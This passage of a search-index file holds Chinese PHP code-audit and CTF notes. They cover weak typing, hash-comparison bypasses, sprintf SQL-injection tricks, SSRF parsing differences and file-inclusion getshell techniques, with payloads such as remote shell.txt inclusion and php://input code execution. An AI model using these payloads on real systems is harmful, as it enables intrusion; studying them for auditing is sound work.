9223372036854775807\uff0c\u56e0\u6b64\uff0c\u572832\u4f4d\u7cfb\u7edf\u4e0a intval(\u20181000000000000\u2019) \u4f1a\u8fd4\u56de 2147483647 \u6b64\u5916intval(10.99999)\u4f1a\u8fd4\u56de10\uff0cintval\u548cint\u7b49\u53d6\u6574\u90fd\u662f\u2019\u622a\u65ad\u2019\u53d6\u6574\uff0c\u5e76\u4e0d\u662f\u56db\u820d\u4e94\u5165 intval\u51fd\u6570\u8fdb\u53bb\u53d6\u6574\u65f6\uff0c\u662f\u76f4\u5230\u9047\u4e0a\u6570\u5b57\u6216\u8005\u6b63\u8d1f\u53f7\u624d\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\uff0c\u4e4b\u540e\u5728\u9047\u5230\u975e\u6570\u5b57\u6216\u8005\u7ed3\u675f\u7b26\u53f7\uff08\\0\uff09\u65f6\u7ed3\u675f\u8f6c\u6362","title":"intval()\u6574\u6570\u6ea2\u51fa\u3001\u5411\u4e0b\u53d6\u6574\u548c\u6574\u5f62\u5224\u65ad\u7684\u95ee\u9898"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#_1","text":"\u5f53\u5c0f\u6570\u5c0f\u4e8e10^-16\u540e\uff0cPHP\u5bf9\u4e8e\u5c0f\u6570\u5c31\u5927\u5c0f\u4e0d\u5206\u4e86 var_dump(1.000000000000000 == 1) >> TRUE var_dump(1.0000000000000001 == 1) >> TRUE","title":"\u6d6e\u70b9\u6570\u7cbe\u5ea6\u95ee\u9898\u5bfc\u81f4\u7684\u5927\u5c0f\u6bd4\u8f83\u95ee\u9898"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#is_numericintval","text":"is_numeric\u51fd\u6570\u5728\u5224\u65ad\u662f\u5426\u662f\u6570\u5b57\u65f6\u4f1a\u5ffd\u7565\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u2019 \u2018\u3001\u2019\\t\u2019\u3001\u2019\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\v\u2019\u3001\u2019\\f\u2019\u3002\u800c\u2019.\u2019\u53ef\u4ee5\u51fa\u73b0\u5728\u4efb\u610f\u4f4d\u7f6e\uff0cE\u3001e\u80fd\u51fa\u73b0\u5728\u53c2\u6570\u4e2d\u95f4\uff0c\u4ecd\u53ef\u4ee5\u88ab\u5224\u65ad\u4e3a\u6570\u5b57\u3002\u4e5f\u5c31\u662f\u8bf4is_numeric(\u201c\\r\\n\\t 0.1e2\u201d) >> TRUE intval()\u51fd\u6570\u4f1a\u5ffd\u7565\u2019\u2019 \u2018\\n\u2019\u3001\u2019\\r\u2019\u3001\u2019\\t\u2019\u3001\u2019\\v\u2019\u3001\u2019\\0\u2019 \uff0c\u4e5f\u5c31\u662f\u8bf4intval(\u201c\\r\\n\\t 12\u201d) >> 12","title":"is_numeric()\u4e0eintval()\u7279\u6027\u5dee\u5f02"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#strcmp","text":"int strcmp ( string $str1,string $str2 ) \u53c2\u6570 str1\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002str2\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b\u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 \u4f46\u662f\u5982\u679c\u4f20\u5165\u7684 \u4e24\u4e2a\u53d8\u91cf\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u8fd4\u56deNULL \uff0c\u5982\u679c\u53ea\u662f\u7528strcmp()==0\u6765\u5224\u65ad\u7684\u8bdd\u5c31\u53ef\u4ee5\u7ed5\u8fc7","title":"strcmp()\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#sha1md5","text":"sha1\uff08\uff09 MD5\uff08\uff09\u51fd\u6570\u9ed8\u8ba4\u63a5\u6536\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c \u4f20\u5165\u7684\u53c2\u6570\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u51fd\u6570\u5c31\u4f1a\u62a5\u9519\u8fd4\u56deNULL \u7c7b\u4f3c sha1(GET[\u2018name\u2032])===sha1(GET[\u2018name\u2032])===sha1(_GET[\u2018password\u2019]) \u7684\u6bd4\u8f83\u5c31\u53ef\u4ee5\u7ed5\u8fc7","title":"sha1()\u3001md5() \u51fd\u6570\u4f20\u5165\u6570\u7ec4\u6bd4\u8f83\u7ed5\u8fc7"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#eregi","text":"eregi\uff08\uff09\u9ed8\u8ba4\u63a5\u6536\u5b57\u7b26\u4e32\u53c2\u6570\uff0c\u5982\u679c\u4f20\u5165\u6570\u7ec4\uff0c\u51fd\u6570\u4f1a\u62a5\u9519\u5e76\u8fd4\u56deNULL\u3002\u540c\u65f6\u8fd8\u53ef\u4ee5%00 \u622a\u65ad\u8fdb\u884c\u7ed5\u8fc7","title":"eregi()\u5339\u914d\u7ed5\u8fc7"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#php-_","text":"1 2 3 4 5 6 7 8 parse_str(\"na.me=admin&pass wd=123\",$test); var_dump($test); array(2) { [\"na_me\"]=> string(5) \"admin\" [\"pass_wd\"]=> string(3) \"123\"","title":"PHP\u53d8\u91cf\u540d\u4e0d\u80fd\u5e26\u6709\u70b9[.] \u548c\u7a7a\u683c\uff0c\u5426\u5219\u5728\u4f1a\u88ab\u8f6c\u5316\u4e3a\u4e0b\u5212\u7ebf[_]"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#in_arrary","text":"1 2 in_arrary(\"1asd\",arrart(1,2,3,4)) => true in_arrary(\"1asd\",arrart(1,2,3,4),TRUE) => false \\\\(\u9700\u8981\u8bbe\u7f6estrict\u53c2\u6570\u4e3atrue\u624d\u4f1a\u8fdb\u884c\u4e25\u683c\u6bd4\u8f83\uff0c\u8fdb\u884c\u7c7b\u578b\u68c0\u6d4b)","title":"in_arrary()\u51fd\u6570\u9ed8\u8ba4\u8fdb\u884c\u677e\u6563\u6bd4\u8f83\uff08\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff09"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#htmlspecialcharsent_quotes","text":"","title":"htmlspecialchars()\u51fd\u6570\u9ed8\u8ba4\u53ea\u8f6c\u4e49\u53cc\u5f15\u53f7\u4e0d\u8f6c\u4e49\u5355\u5f15\u53f7\uff0c\u5982\u679c\u90fd\u8f6c\u4e49\u7684\u8bdd\u9700\u8981\u6dfb\u52a0\u4e0a\u53c2\u6570ENT_QUOTES"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#php4php521keymagic_quotes_gpc","text":"","title":"\u5728php4\u3001php&lt;5.2.1\u4e2d\uff0c\u53d8\u91cf\u7684key\u503c\u4e0d\u53d7magic_quotes_gpc\u5f71\u54cd"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#sprintf","text":"printf\uff08\uff09\u548csprintf\uff08\uff09\u51fd\u6570\u4e2d\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528%\u63a5\u4e00\u4e2a\u5b57\u7b26\u6765\u8fdb\u884cpadding\u529f\u80fd \u4f8b\u5982%10s \u5b57\u7b26\u4e32\u4f1a\u9ed8\u8ba4\u5728\u5de6\u4fa7\u586b\u5145\u7a7a\u683c\u81f3\u957f\u5ea6\u4e3a10\uff0c\u8fd8\u53ef\u4ee5 %010s \u4f1a\u4f7f\u7528\u5b57\u7b260\u8fdb\u884c\u586b\u5145\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u7528\u522b\u7684\u5b57\u7b26\u8fdb\u884c\u586b\u5145\uff0c\u9700\u8981\u4f7f\u7528 \u2018 \u5355\u5f15\u53f7\u8fdb\u884c\u6807\u8bc6\uff0c\u4f8b\u5982 %\u2019#10s \u8fd9\u4e2a\u5c31\u662f\u4f7f\u7528#\u8fdb\u884c\u586b\u5145\uff08\u767e\u5206\u53f7\u4e0d\u4ec5\u4f1a\u5403\u6389\u2019\u5355\u5f15\u53f7\uff0c\u8fd8\u4f1a\u5403\u6389 \u659c\u6760\uff09 \u540c\u65f6sprintf\uff08\uff09\u53ef\u4ee5\u4f7f\u7528\u6307\u5b9a\u53c2\u6570\u4f4d\u7f6e\u7684\u5199\u6cd5 %\u540e\u9762\u7684\u6570\u5b57\u4ee3\u8868\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c$\u540e\u4ee3\u8868\u683c\u5f0f\u5316\u7c7b\u578b \u8f93\u5165\u7684\u7279\u6b8a\u5b57\u7b26\u88ab\u653e\u5230\u5f15\u53f7\u4e2d\u8fdb\u884c\u8f6c\u4e49\u65f6\uff0c\u4f46\u662f\u53c8\u4f7f\u7528\u4e86sprintf\u51fd\u6570\u8fdb\u884c\u62fc\u63a5\u65f6 \u4f8b\u5982 %1$'%s' \u4e2d\u7684 '% \u88ab\u5f53\u6210\u4f7f\u7528 % \u8fdb\u884cpadding\uff0c\u5bfc\u81f4\u540e\u4e00\u4e2a ' \u9003\u9038\u4e86 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u5c31\u662f ' \u88ab\u8f6c\u4e49\u6210\u4e86 \\' ,\u4f8b\u5982\u8f93\u5165 %'and 1=1# \u8fdb\u5165\uff0c\u5b58\u5728SQL\u8fc7\u6ee4\uff0c ' \u88ab\u8f6c\u6210\u4e86 \\' \u4e8e\u662fsql\u8bed\u53e5\u53d8\u6210\u4e86 select * from user where username = '%\\' and 1=1#'; \u5982\u679c\u8fd9\u4e2a\u8bed\u53e5\u88ab\u4f7f\u7528sprintf\u51fd\u6570\u8fdb\u884c\u4e86\u62fc\u63a5\uff0c % \u540e\u7684 \\ \u88ab\u5403\u6389\u4e86\uff0c\u5bfc\u81f4\u4e86 \u2019 \u9003\u9038 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%\\' and 1=1#';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' ?> \u4e0d\u8fc7\u8fd9\u6837\u5bb9\u6613\u9047\u5230 PHP Warning: sprintf(): Too few arguments \u7684\u62a5\u9519 \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 %1$ \u6765\u5403\u6389\u8f6c\u79fb\u6dfb\u52a0\u7684 \\ 1 2 3 4 5 6 <?php $sql = \"select * from user where username = '%1 $\\ ' and 1=1#' and password='%s';\" ; $args = \"admin\" ; echo sprintf ( $sql , $args ) ; //result: select * from user where username = '' and 1=1#' and password='admin'; ?>","title":"sprintf()\u683c\u5f0f\u5316\u6f0f\u6d1e\uff08\u53ef\u4ee5\u5403\u6389\u8f6c\u4e49\u540e\u7684\u5355\u5f15\u53f7"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#php-and","text":"$c = is_numeric($a) and is_numeric($b) \u7a0b\u5e8f\u672c\u610f\u662f\u8981a\u3001b\u90fd\u4e3a\u6570\u5b57\u624d\u4f1a\u7ee7\u7eed\uff0c\u4f46\u662f\u5f53a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9a\u4e3a\u6570\u5b57\u65f6\uff0c\u4f1a\u5148\u8d4b\u503c\u7ed9c\uff0c\u6240\u4ee5\u53ef\u80fd\u5bfc\u81f4$b\u7ed5\u8fc7\u68c0\u6d4b","title":"php\u4e2d = \u8d4b\u503c\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8eand"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#parse_urllibcurlurlssrf","text":"\u5f53url\u4e2d\u6709\u591a\u4e2a@\u7b26\u53f7\u65f6\uff0c parse_url\u4e2d\u83b7\u53d6\u7684host\u662f\u6700\u540e\u4e00\u4e2a@\u7b26\u53f7\u540e\u9762\u7684host\uff0c\u800clibcurl\u5219\u662f\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a@\u7b26\u53f7\u4e4b\u540e\u7684\u3002 \u56e0\u6b64\u5f53\u4ee3\u7801\u5bf9 http://user@eval.com:80@baidu.com \u8fdb\u884c\u89e3\u6790\u65f6\uff0cPHP\u83b7\u53d6\u7684host\u662fbaidu.com\u662f\u5141\u8bb8\u8bbf\u95ee\u7684\u57df\u540d\uff0c\u800c\u6700\u540e\u8c03\u7528libcurl\u8fdb\u884c\u8bf7\u6c42\u65f6\u5219\u662f\u8bf7\u6c42\u7684eval.com\u57df\u540d\uff0c\u53ef\u4ee5\u9020\u6210ssrf\u7ed5\u8fc7 \u6b64\u5916\u5bf9\u4e8e https://evil@baidu.com \u8fd9\u6837\u7684\u57df\u540d\u8fdb\u884c\u89e3\u6790\u65f6,php\u83b7\u53d6\u7684host\u662f evil@baidu.com \uff0c\u4f46\u662flibcurl\u83b7\u53d6\u7684host\u5374\u662fevil.com","title":"parse_url\u4e0elibcurl\u5bf9\u4e0eurl\u7684\u89e3\u6790\u5dee\u5f02\u53ef\u80fd\u5bfc\u81f4ssrf"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#urlfilter_varparse_urlssrf","text":"filter_var()\u51fd\u6570\u5bf9\u4e8e http://evil.com;google.com \u4f1a\u8fd4\u56defalse\u4e5f\u5c31\u662f\u8ba4\u4e3aurl\u683c\u5f0f\u9519\u8bef\uff0c\u4f46\u662f\u5bf9\u4e8e 0://evil.com:80;google.com:80/ \u3001 0://evil.com:80,google.com:80/ \u3001 0://evil.com:80\\google.com:80/ \u5374\u8fd4\u56detrue.","title":"url\u6807\u51c6\u7684\u7075\u6d3b\u6027\u5bfc\u81f4\u7ed5\u8fc7filter_var\u4e0eparse_url\u8fdb\u884cssrf"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#file_get_contentsxss","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if(filter_var($argv[1], FILTER_VALIDATE_URL)) { // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/baidu\\.com$/', $r['host'])) { // get page from URL $a = file_get_contents($argv[1]); echo($a); } else { echo \"Error: Host not allowed\"; } } else { echo \"Error: Invalid URL\"; } \u867d\u7136\u901a\u8fc7filter_var\u51fd\u6570\u5bf9url\u7684\u683c\u5f0f\u8fdb\u884c\u68c0\u67e5\uff0c\u5e76\u4e14\u4f7f\u7528\u6b63\u5219\u5bf9url\u7684host\u8fdb\u884c\u9650\u5b9a \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo= \u9875\u9762\u4f1a\u5c06 <script>alert(1)</script> \u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u5c31\u6709\u53ef\u80fd\u9020\u6210xss","title":"\u901a\u8fc7file_get_contents\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u5e76\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u6709\u53ef\u80fd\u9020\u6210xss"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc61/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 md5(\u2018240610708\u2019); // 0e462097431906509019562988736854 md5(\u2018QNKCDZO\u2019); // 0e830400451993494058024219903391 md5(\u2018240610708\u2019) == md5(\u2018QNKCDZO\u2019) md5(\u2018aabg7XSs\u2019) == md5(\u2018aabC9RqS\u2019) sha1(\u2018aaroZmOk\u2019) == sha1(\u2018aaK1STfY\u2019) sha1(\u2018aaO8zKZF\u2019) == sha1(\u2018aa3OFF9m\u2019) \u20180010e2\u2019 == \u20181e3\u2019 \u20180x1234Ab\u2019 == \u20181193131\u2018 \u20180xABCdef\u2019 == \u2018 0xABCdef\u2019 \u5f53\u8f6c\u6362\u4e3aboolean\u65f6\uff0c\u4ee5\u4e0b\u53ea\u88ab\u8ba4\u4e3a\u662fFALSE\uff1aFALSE\u30010\u30010.0\u3001\u201c\u201d\u3001\u201c0\u201d\u3001array()\u3001NULL 1 2 3 PHP 7 \u4ee5\u524d\u7684\u7248\u672c\u91cc\uff0c\u5982\u679c\u5411\u516b\u8fdb\u5236\u6570\u4f20\u9012\u4e86\u4e00\u4e2a\u975e\u6cd5\u6570\u5b57\uff08\u5373 8 \u6216 9\uff09\uff0c\u5219\u540e\u9762\u5176\u4f59\u6570\u5b57\u4f1a\u88ab\u5ffd\u7565\u3002var_dump(0123)=var_dump(01239)=83 PHP 7 \u4ee5\u540e\uff0c\u4f1a\u4ea7\u751f Parse Error\u3002 1 2 3 4 5 6 7 \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u503c\u65f6\uff0c\u82e5\u5b57\u7b26\u4e32\u5f00\u5934\u6709\u6570\u5b57\uff0c\u5219\u8f6c\u4e3a\u6570\u5b57\u5e76\u7701\u7565\u540e\u9762\u7684\u975e\u6570\u5b57\u5b57\u7b26\u3002\u82e5\u4e00\u5f00\u5934\u6ca1\u6709\u6570\u5b57\u5219\u8f6c\u6362\u4e3a0 \\$foo = 1 + \u201cbob-1.3e3\u201d; // $foo is integer (1) \\$foo = 1 + \u201cbob3\u201d; // $foo is integer (1) \\$foo = 1 + \u201c10 Small Pigs\u201d; // $foo is integer (11) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u2018\u2019 == 0 == false \u2018123\u2019 == 123 \u2018abc\u2019 == 0 \u2018123a\u2019 == 123 \u20180x01\u2019 == 1 \u20180e123456789\u2019 == \u20180e987654321\u2019 [false] == [0] == [NULL] == [\u2018\u2019] NULL == false == 0\u00bb true == 1","title":"\u5f31\u7c7b\u578b"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/","text":"\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf \u00b6 \u6587\u4ef6\u5305\u542b\u51fd\u6570 \u00b6 include require include_once require_once include\u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\u4f1a\u53d1\u51fa\u8b66\u544a\uff0c\u800crequire\u5219\u4f1a\u53d1\u51fa\u4e00\u4e2a\u81f4\u547d\u9519\u8bef \u5982\u679c\u201cURL include wrappers\u201d\u5728 PHP \u4e2d\u88ab\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u7528 URL\uff08\u901a\u8fc7 HTTP \u6216\u8005\u5176\u5b83\u652f\u6301\u7684\u5c01\u88c5\u534f\u8bae\u2014\u2014\u89c1\u652f\u6301\u7684\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae\uff09\u800c\u4e0d\u662f\u672c\u5730\u6587\u4ef6\u6765\u6307\u5b9a\u8981\u88ab\u5305\u542b\u7684\u6587\u4ef6\u3002\u5982\u679c\u76ee\u6807\u670d\u52a1\u5668\u5c06\u76ee\u6807\u6587\u4ef6\u4f5c\u4e3a PHP \u4ee3\u7801\u89e3\u91ca\uff0c\u5219\u53ef\u4ee5\u7528\u9002\u7528\u4e8e HTTP GET \u7684 URL \u8bf7\u6c42\u5b57\u7b26\u4e32\u6765\u5411\u88ab\u5305\u62ec\u7684\u6587\u4ef6\u4f20\u9012\u53d8\u91cf\u3002\u4e25\u683c\u7684\u8bf4\u8fd9\u548c\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u5e76\u7ee7\u627f\u7236\u6587\u4ef6\u7684\u53d8\u91cf\u7a7a\u95f4\u5e76\u4e0d\u662f\u4e00\u56de\u4e8b\uff1b\u8be5\u811a\u672c\u6587\u4ef6\u5b9e\u9645\u4e0a\u5df2\u7ecf\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u4e86\uff0c\u800c\u672c\u5730\u811a\u672c\u5219\u5305\u62ec\u4e86\u5176\u7ed3\u679c\u3002 \u652f\u6301\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 file:// \u8fd9\u4e2a\u534f\u8bae\u53ef\u4ee5\u5c55\u73b0\u672c\u5730\u6587\u4ef6\u7cfb\u7edf,\u9ed8\u8ba4\u76ee\u5f55\u662f\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002 file:///path/to/file.ext \u5728\u6587\u4ef6\u5305\u542b\u4e2d\u5176\u5b9e\u4e5f\u5c31\u662f\u7b49\u4ef7 /path/to/file.ext` \u4f46\u662f\u5982\u679c\u6765\u4e2a\u9898\u76ee\u7ed9\u4f60\u6765\u4e2a\u6b63\u5219\u5339\u914d`../` \u6216`/ \u5f00\u5934\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4e86\u3002 php:// (1)php://input\u662f\u4e2a\u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41 (2)php://filter \u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c \u8bbe\u8ba1\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7684\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528 1 2 3 4 5 6 7 1 readfile(\"http://www.example.com\"); \u7b49\u4ef7\u4e8ereadfile(\"php://filter/resource=http://www.example.com\"); 2 \u8bfb\u53d6\u94fe file_get_contents(\"php://filter/read=convert.base64-encode/resource=test.php\"); 3. \u5199\u5165\u94fe file_put_contents(\"php://filter/write=convert.base64-decode/resource=[file]\",\"base64\"); \u8fd9\u4e2a\u70b9\u5728ctf\u6709\u65f6\u5019\u4f1a\u5f88\u6709\u7528,\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9bwaf (3)php://input \u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41, \u5c06post\u8bf7\u6c42\u4e2d\u7684\u6570\u636e\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c\u3002 \u6709\u81ea\u8eab\u5c40\u9650\u6027: allow_url_fopen :off/on (\u9ed8\u8ba4\u914d\u7f6eon) allow_url_include:on (\u9ed8\u8ba4\u914d\u7f6eoff) GetShell\u601d\u8def \u00b6 allow_url_include \u5f00\u542f\u7684\u60c5\u51b5 \u00b6 allow_url_include \u9ed8\u8ba4\u73af\u5883\u5728php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aoff,\u6240\u4ee5\u8bf4\u8fd9\u4e2a\u7528\u6cd5\u6bd4\u8f83\u9e21\u808b,\u4f46\u662f\u5e73\u65f6\u5728\u770bphpinfo\u7684\u65f6\u5019\u53ef\u4ee5\u67e5\u770b\u4e0b\u8fd9\u4e2a\u662f\u5426\u5f00\u542f\u3002 allow_url_fopen \u9ed8\u8ba4\u5f00\u542f,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u8fdc\u7a0burl\u6216\u8005php://\u534f\u8bae\u76f4\u63a5getshell 1. http://127.0.0.1:8888/ctf/cli/3.php?file=http://remote.com/shell.txt 2. http://127.0.0.1:8888/ctf/cli/3.php?file=php://input PostData:<?php phpinfo();?> \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u70b9\u7684\u662f\u6d4f\u89c8\u5668\u5728\u4f20\u8f93\u8fc7\u7a0b\u4f1a\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884curl\u7f16\u7801,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528burp\u7ed5\u8fc7\u8fd9\u4e00\u6b65 \u6216\u8005\u76f4\u63a5curl \u547d\u4ee4 curl -v \"http://127.0.0.1:8888/ctf/cli/3.php?file=php://input\" -d \"<?php phpinfo();?>\" 3. http://10.211.55.20:8081/test.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg== \u901a\u8fc7 data:// \u534f\u8bae\u53ef\u4ee5\u76f4\u63a5\u89e3\u6790base64\u7f16\u7801 allow_url_include \u5173\u95ed\u53ccoff\u7684\u60c5\u51b5(window\u73af\u5883\u4e0b) \u00b6 \u5c31\u7b97\u5373\u4f7f allow_url_include and allow_url_fopen \u5747\u4e3aoff \u5728 window\u4e3b\u673a\u73af\u5883 \u4e0b\u4ecd\u7136\u53ef\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u6267\u884c 1\uff1a\u4ec0\u4e48\u662fUNC\u8def\u5f84\uff1fUNC\u8def\u5f84\u5c31\u662f\u7c7b\u4f3c\\softer\u8fd9\u6837\u7684\u5f62\u5f0f\u7684\u7f51\u7edc\u8def\u5f84\u3002 2\uff1aUNC\u4e3a\u7f51\u7edc\uff08\u4e3b\u8981\u6307\u5c40\u57df\u7f51\uff09\u4e0a\u8d44\u6e90\u7684\u5b8c\u6574Windows 2000\u540d\u79f0\u3002 \u6ce8\u610f\u4e3b\u8981\u8fd9\u4e2a\u5b57,\u6240\u4ee5\u8bf4\u4e5f\u652f\u6301\u8fdc\u7a0b\u7f51\u7edc \u683c\u5f0f\uff1a\\servername\\sharename\uff0c\u5176\u4e2dservername\u662f\u670d\u52a1\u5668\u540d\u3002sharename\u662f\u5171\u4eab\u8d44\u6e90\u7684\u540d\u79f0\u3002 \u76ee\u5f55\u6216\u6587\u4ef6\u7684UNC\u540d\u79f0\u53ef\u4ee5\u5305\u62ec\u5171\u4eab\u540d\u79f0\u4e0b\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u683c\u5f0f\u4e3a\uff1a\\servername\\sharename\\directory\\filename\u3002 2\uff1aunc\u5171\u4eab\u5c31\u662f\u6307 \u7f51\u7edc\u786c\u76d8 \u7684\u5171\u4eab \u56e0\u4e3a allow_url_include \u4e3aoff\u7684\u65f6\u5019,php\u4e0d\u4f1a\u52a0\u8f7d\u8fdc\u7a0b\u7684http \u6216\u8005 ftp\u7684url,\u4f46\u662f\u6ca1\u6709\u7981\u6b62SMB\u7684URL\u52a0\u8f7d\u3002 \u56e0\u4e3aSMB share\u670d\u52a1\u5668\u9700\u8981\u7528UNC\u8def\u5f84\u53bb\u8bbf\u95ee,\u800cLinux\u6ca1\u6709UNC\u8def\u5f84\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u53ea\u80fd\u5728window\u4e0b\u5229\u7528 \u5c1d\u8bd5\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u3001\u73af\u5883\u6587\u4ef6\u7b49\u53ef\u63a7\u6587\u4ef6 \u00b6 \u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u5176\u5b9e\u5728\u5b9e\u6218\u4e2d\u662f\u6bd4\u8f83\u9e21\u808b\u7684,\u56e0\u4e3a\u9ed8\u8ba4\u7684\u6743\u9650\u662f\u4e0d\u5141\u8bb8\u8bbf\u95ee\u7684,\u4f46\u662f\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u4e0b\u3002 \u4e0d\u8fc7\u5982\u679c\u4e3b\u673a\u662fwindow\u7cfb\u7edf,\u50cfphpstudy\u90a3\u79cd\u4e00\u952e\u5b89\u88c5\u7684\u90fd\u5177\u6709\u9ad8\u6743\u9650,\u5b8c\u5168\u53ef\u4ee5\u901a\u8fc7\u5305\u542b\u4e00\u4e9b\u6587\u4ef6\u6765getshell\u3002","title":"\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#_1","text":"","title":"\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf"},{"location":"audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#_2","text":"include require include_once require_once include\u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\u4f1a\u53d1\u51fa\u8b66\u544a\uff0c\u800crequire\u5219\u4f1a\u53d1\u51fa\u4e00\u4e2a\u81f4\u547d\u9519\u8bef \u5982\u679c\u201cURL include wrappers\u201d\u5728 PHP \u4e2d\u88ab\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u7528 URL\uff08\u901a\u8fc7 HTTP 